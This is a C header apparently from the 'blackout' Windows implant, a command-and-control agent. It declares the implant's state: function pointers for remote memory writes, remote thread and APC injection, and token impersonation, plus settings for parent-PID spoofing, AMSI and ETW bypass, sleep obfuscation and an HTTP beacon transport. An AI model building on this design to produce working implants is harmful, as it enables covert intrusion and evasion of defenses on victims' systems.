#ifndef INSTANCE_COMMON_H
#define INSTANCE_COMMON_H

//
// system headers
//
#include <windows.h>
#include <iphlpapi.h>
#include <stdio.h>
//
// blackout headers
//
#include <native.h>
#include <macros.h>
#include <bkapi.h>
#include <utils.h>
#include <package.h>
#include <command.h>
#include <transport.h>

#define BLACKOUT_COMMAND_LENGTH 10
#define BLACKOUT_MAGIC_VALUE ( UINT32 ) 'taln'

//
// blackout instances
//
EXTERN_C ULONG __Instance_offset;
EXTERN_C PVOID __Instance;

typedef struct _INSTANCE {

    PTEB Teb;

    //
    // base address and size
    // of the implant
    //
    BUFFER Base;

    struct {
        BOOL    (WINAPI *CreatePipe)(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
        HANDLE  (WINAPI *CreateNamedPipeA)(LPCSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
        HANDLE  (WINAPI *CreateNamedPipeW)(LPCWSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
        BOOL    (WINAPI *ConnectNamedPipe)(HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped);
        HANDLE  (WINAPI *CreateMailslotA)(LPCSTR lpName, DWORD nMaxMessageSize, DWORD lReadTimeout, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
        HANDLE  (WINAPI *CreateMailslotW)(LPCWSTR lpName, DWORD nMaxMessageSize, DWORD lReadTimeout, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
        HANDLE  (WINAPI *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
        HANDLE  (WINAPI *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
        BOOL    (WINAPI *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
        DWORD   (WINAPI *FormatMessageA)(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list *Arguments);
        BOOL    (WINAPI *CreateTimerQueueTimer)(PHANDLE phNewTimer, HANDLE TimerQueue, WAITORTIMERCALLBACK Callback, PVOID Parameter, DWORD DueTime, DWORD Period, ULONG Flags);
        HANDLE  (WINAPI *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
        BOOL    (WINAPI *OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
        HANDLE  (WINAPI *OpenThread)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId);
        BOOL    (WINAPI *OpenThreadToken)(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle);
        BOOL    (WINAPI *CreateProcessA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
        BOOL    (WINAPI *CreateProcessW)(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
        BOOL    (WINAPI *CreateProcessAsUserA)(HANDLE hToken, LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
        BOOL    (WINAPI *CreateProcessAsUserW)(HANDLE hToken, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
        BOOL    (WINAPI *CreateProcessWithLogonW)(LPCWSTR lpUsername, LPCWSTR lpDomain, LPCWSTR lpPassword, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
        BOOL    (WINAPI *CreateProcessWithTokenW)(HANDLE hToken, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
        BOOL    (WINAPI *InitializeProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwAttributeCount, DWORD dwFlags, PSIZE_T lpSize);
        BOOL    (WINAPI *UpdateProcThreadAttribute)(LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwFlags, DWORD_PTR Attribute, PVOID lpValue, SIZE_T cbSize, PVOID lpPreviousValue, PSIZE_T lpReturnSize);
        BOOL    (WINAPI *WaitForDebugEvent)(LPDEBUG_EVENT lpDebugEvent, DWORD dwMilliseconds);
        BOOL    (WINAPI *WriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
        BOOL    (WINAPI *DebugActiveProcessStop)(DWORD dwProcessId);
        BOOL    (WINAPI *ContinueDebugEvent)(DWORD dwProcessId, DWORD dwThreadId, DWORD dwContinueStatus);
        BOOL    (WINAPI *CloseHandle)(HANDLE hObject);
        DWORD   (WINAPI *GetLastError)();
        HMODULE (WINAPI *LoadLibraryA)(LPCSTR lpLibFileName);
        HLOCAL  (WINAPI *LocalAlloc)(UINT uFlags, SIZE_T uBytes);
        HLOCAL  (WINAPI *LocalFree)(HLOCAL hMem);
        HLOCAL  (WINAPI *LocalReAlloc)(HLOCAL hMem, SIZE_T uBytes, UINT uFlags);
        BOOL    (WINAPI *VirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
        SIZE_T  (WINAPI *VirtualQuery)(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
        SIZE_T  (WINAPI *VirtualQueryEx)(HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
        LPVOID  (WINAPI *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
        LPVOID  (WINAPI *VirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
        BOOL    (WINAPI *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
        BOOL    (WINAPI *VirtualProtectEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
        DWORD   (WINAPI *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
        DWORD   (WINAPI *WaitForSingleObjectEx)(HANDLE hHandle, DWORD dwMilliseconds, BOOL bAlertable);
        HANDLE  (WINAPI *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
        HANDLE  (WINAPI *CreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
        DWORD   (WINAPI *QueueUserAPC)(PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData);
        FARPROC (WINAPI *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
        HMODULE (WINAPI *GetModuleHandleA)(LPCSTR lpModuleName);
        DWORD   (WINAPI *GetTickCount)(void);
        BOOL    (WINAPI *GetComputerNameExA)(COMPUTER_NAME_FORMAT NameType, LPSTR lpBuffer, LPDWORD nSize);
        BOOL    (WINAPI *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
        BOOL    (WINAPI *GetProductInfo)(DWORD dwOSMajorVersion, DWORD dwOSMinorVersion, DWORD dwSpMajorVersion, DWORD dwSpMinorVersion, PDWORD pdwReturnedProductType);
        void    (WINAPI *GetNativeSystemInfo)(LPSYSTEM_INFO lpSystemInfo);
        BOOL    (WINAPI *HeapWalk)(HANDLE hHeap, LPPROCESS_HEAP_ENTRY lpEntry);
        DWORD   (WINAPI *GetCurrentDirectoryA)(DWORD nBufferLength, LPSTR lpBuffer);
        BOOL    (WINAPI *SetCurrentDirectoryA)(LPCSTR lpPathName);
        BOOL    (WINAPI *DuplicateHandle)(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
        DWORD   (WINAPI *GetThreadId)(HANDLE Thread);
        DWORD   (WINAPI *ResumeThread)(HANDLE hThread);
        DWORD   (WINAPI *SuspendThread)(HANDLE hThread);
        BOOL    (WINAPI *TerminateThread)(HANDLE hThread, DWORD dwExitCode);
        DWORD   (WINAPI *GetMappedFileNameA)( HANDLE hProcess, LPVOID lpv, LPSTR lpFilename, DWORD nSize);        
        BOOL    (WINAPI *SetFileInformationByHandle)( HANDLE hFile, FILE_INFO_BY_HANDLE_CLASS FileInformationClass, LPVOID lpFileInformation, DWORD dwBufferSize );

        void     (NTAPI *RtlExitUserProcess)(NTSTATUS ExitStatus);
        void     (NTAPI *RtlExitUserThread)(NTSTATUS ExitStatus);
        PVOID    (NTAPI *RtlAllocateHeap)(PVOID HeapHandle, ULONG Flags, SIZE_T Size);
        PVOID    (NTAPI *RtlCreateHeap)(ULONG Flags, PVOID HeapBase, SIZE_T ReserveSize, SIZE_T CommitSize, PVOID Lock, PRTL_HEAP_PARAMETERS Parameters);
        BOOLEAN  (NTAPI *RtlFreeHeap)(PVOID HeapHandle, ULONG Flags, PVOID BaseAddress);
        PVOID    (NTAPI *RtlReAllocateHeap)(PVOID HeapHandle, ULONG Flags, PVOID BaseAddress, SIZE_T Size);
        NTSTATUS (NTAPI *RtlCreateTimer)(HANDLE TimerQueueHandle, PHANDLE Handle, WAITORTIMERCALLBACKFUNC Function, PVOID Context, ULONG DueTime, ULONG Period, ULONG Flags);
        NTSTATUS (NTAPI *RtlRandomEx)(PULONG Seed);
        NTSTATUS (NTAPI *RtlGetVersion)(PRTL_OSVERSIONINFOW lpVersionInformation);
        NTSTATUS (NTAPI *RtlIpv6StringToAddressA)(PCSTR S, PCSTR* Terminator, PVOID Addr);
        NTSTATUS (NTAPI *NtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
        NTSTATUS (NTAPI *NtProtectVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection);
        NTSTATUS (NTAPI *NtCreateThreadEx)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
        NTSTATUS (NTAPI *LdrLoadDll)(PWCHAR PathToFile, ULONG Flags, PUNICODE_STRING ModuleFileName, PHANDLE ModuleHandle);
        NTSTATUS (NTAPI *NtGetNextProcess)(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Flags, PHANDLE NewProcessHandle);

        NTSTATUS (NTAPI *NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
        NTSTATUS (NTAPI *NtQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
        NTSTATUS (NTAPI *NtQueryVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength);    
        NTSTATUS (NTAPI *NtQueryInformationToken)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, PVOID TokenInformation, ULONG TokenInformationLength, PULONG ReturnLength);
        NTSTATUS (NTAPI *NtQueryInformationThread)(HANDLE ThreadHandle, THREADINFOCLASS ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength, PULONG ReturnLength);
        NTSTATUS (NTAPI *NtQueryInformationFile)(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass);
        NTSTATUS (NTAPI *NtSetInformationVirtualMemory)(HANDLE ProcessHandle, VIRTUAL_MEMORY_INFORMATION_CLASS VmInformationClass, ULONG_PTR NumberOfEntries, PMEMORY_RANGE_ENTRY VirtualAddresses, PVOID VmInformation, ULONG VmInformationLength);

        NTSTATUS (NTAPI *NtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
        NTSTATUS (NTAPI *NtWaitForSingleObject)(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
        NTSTATUS (NTAPI *NtSignalAndWaitForSingleObject)(HANDLE SignalHandle, HANDLE WaitHandle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
        NTSTATUS (NTAPI *NtTestAlert)(void);
        NTSTATUS (NTAPI *NtQueueApcThread)(HANDLE ThreadHandle, PPS_APC_ROUTINE ApcRoutine, PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3);
        NTSTATUS (NTAPI *NtGetContextThread)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
        NTSTATUS (NTAPI *NtSetContextThread)( HANDLE ThreadHandle, PCONTEXT ThreadContext );
        NTSTATUS (NTAPI *NtAlertResumeThread)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
        NTSTATUS (NTAPI *NtCreateEvent)(PHANDLE EventHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, EVENT_TYPE EventType, BOOLEAN InitialState);
        NTSTATUS (NTAPI *NtContinue)(PCONTEXT ContextRecord, BOOLEAN TestAlert);
        NTSTATUS (NTAPI *NtClose)(HANDLE Handle);
        NTSTATUS (NTAPI *NtTerminateProcess)(HANDLE ProcessHandle, NTSTATUS ExitStatus);
        NTSTATUS (NTAPI *NtCreateFile)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
        NTSTATUS (NTAPI *NtCreateNamedPipeFile)(PHANDLE FileHandle, ULONG DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, ULONG NamedPipeType, ULONG ReadMode, ULONG CompletionMode, ULONG MaximumInstances, ULONG InboundQuota, ULONG OutboundQuota, PLARGE_INTEGER DefaultTimeout);
        NTSTATUS (NTAPI *NtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, const void *Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten);
        NTSTATUS (NTAPI *NtSuspendProcess)(HANDLE ProcessHandle);
        NTSTATUS (NTAPI *NtTerminateThread)(HANDLE ThreadHandle, NTSTATUS ExitStatus);
        NTSTATUS (NTAPI *NtResumeThread)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
        NTSTATUS (NTAPI *NtSuspendThread)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
        NTSTATUS (NTAPI *NtOpenProcessToken)(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle);
        NTSTATUS (NTAPI *NtOpenProcessTokenEx)(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, PHANDLE TokenHandle);
        NTSTATUS (NTAPI *NtOpenThreadToken)(HANDLE ThreadHandle, ACCESS_MASK DesiredAccess, BOOLEAN OpenAsSelf, PHANDLE TokenHandle);
        NTSTATUS (NTAPI *NtOpenThreadTokenEx)(HANDLE ThreadHandle, ACCESS_MASK DesiredAccess, BOOLEAN OpenAsSelf, ULONG HandleAttributes, PHANDLE TokenHandle);

        BOOL     (WINAPI *GetUserNameA)(LPSTR lpBuffer, LPDWORD pcbBuffer);
        NTSTATUS (NTAPI  *SystemFunction032)(struct USTRING* Img, struct USTRING* Key);
        BOOL     (WINAPI *LookupAccountSidA)(LPCSTR lpSystemName, PSID Sid, LPSTR Name, LPDWORD cchName, LPSTR ReferencedDomainName, LPDWORD cchReferencedDomainName, PSID_NAME_USE peUse);
        BOOL     (WINAPI *LookupPrivilegeValueA)(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);
        BOOL     (WINAPI *AdjustTokenPrivileges)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
        BOOL     (WINAPI *DuplicateToken)(HANDLE ExistingTokenHandle, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, PHANDLE DuplicateTokenHandle);
        WINBOOL  (WINAPI *ImpersonateLoggedOnUser)(HANDLE hToken);

        NTSTATUS (NTAPI *SystemFunction040)( PVOID Memory, ULONG MemorySize, ULONG OptionFlags );
        NTSTATUS (NTAPI *SystemFunction041)( PVOID Memory, ULONG MemorySize, ULONG OptionFlags );

        HINTERNET (*WinHttpOpen)(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);
        HINTERNET (*WinHttpConnect)(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved);
        HINTERNET (*WinHttpOpenRequest)(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR *ppwszAcceptTypes, DWORD dwFlags);
        BOOL      (*WinHttpReceiveResponse)(HINTERNET hRequest, LPVOID lpReserved);
        BOOL      (*WinHttpSendRequest)(HINTERNET hRequest, LPCWSTR pwszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext);
        BOOL      (*WinHttpReadData)(HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
        BOOL      (*WinHttpSetOption)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
        BOOL      (*WinHttpCloseHandle)(HINTERNET hInternet);

        D_API( printf );

        ULONG (*GetAdaptersInfo)( PIP_ADAPTER_INFO AdapterInfo, PULONG SizePointer );
    } Win32;

    struct {
        PVOID Ntdll;
        PVOID Kernelbase;
        PVOID Kernel32;
        PVOID Winhttp;
        PVOID Advapi32;
        PVOID Msvcrt;
        PVOID User32;
        PVOID Iphlpapi;
        PVOID Cryptbase;
        PVOID Cryptsp;
    } Modules;

    struct {
        PSTR  Spawnto;
        DWORD Ppid;
        BOOL  Blockdlls;
        PWSTR Argue;            
    } Fork;

    struct {   
        LPWSTR   UserAgent;
        LPWSTR   Host;
        DWORD    Port;
        PPACKAGE Package;
        BOOL     Secure;
    } Transport;
    
    struct {
        DWORD  AgentId;
        DWORD  ProcessArch;
        BOOL   Elevated;
        BOOL   Connected;
        PWSTR  ProcessName;
        PWSTR  ProcessFullPath;
        PWSTR  ProcessCmdLine;
        BOOL   Protected;
        DWORD  ParentProcId;
        DWORD  ProcessId;
        DWORD  ThreadId;
        PVOID  Heap;
        DWORD  SleepObf;
        DWORD  SleepTime;
        DWORD  Jitter;
        BOOL   AmsiBypass;
        BOOL   EtwBypass;
        UINT64 KillDate;
        UINT32 WorkingHours;
    } Session;

    struct {
        CHAR  UserName[MAX_PATH];
        CHAR  DomainName[MAX_PATH];
        CHAR  ComputerName[MAX_PATH];
        CHAR  NetBios[MAX_PATH];
        WORD  OsArch;
        DWORD OsMajorV;
        DWORD OsMinorv;
        WORD  OsBuildNumber;
        DWORD ProcessorType;
        DWORD ProductType;
        PSTR  IpAddress;
    } System;

    BLACKOUT_COMMAND Commands[ BLACKOUT_COMMAND_LENGTH ];

} INSTANCE, *PINSTANCE;

EXTERN_C PVOID StRipStart();
EXTERN_C PVOID StRipEnd();

#endif //INSTANCE_COMMON_H
